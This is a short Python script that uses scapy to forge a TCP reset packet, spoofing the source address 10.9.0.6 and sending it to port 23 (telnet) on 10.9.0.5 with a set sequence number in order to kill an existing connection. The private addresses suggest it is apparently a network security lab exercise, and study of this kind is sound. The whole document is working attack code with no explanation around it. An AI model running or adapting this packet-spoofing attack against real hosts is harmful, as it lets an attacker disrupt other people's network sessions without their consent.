#!/usr/bin/env python3
from scapy.all import *

# Forge the RST packet
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=56500, dport=23, flags="R", seq=1355929640)

# Combine and send
pkt = ip / tcp
send(pkt, verbose=1)
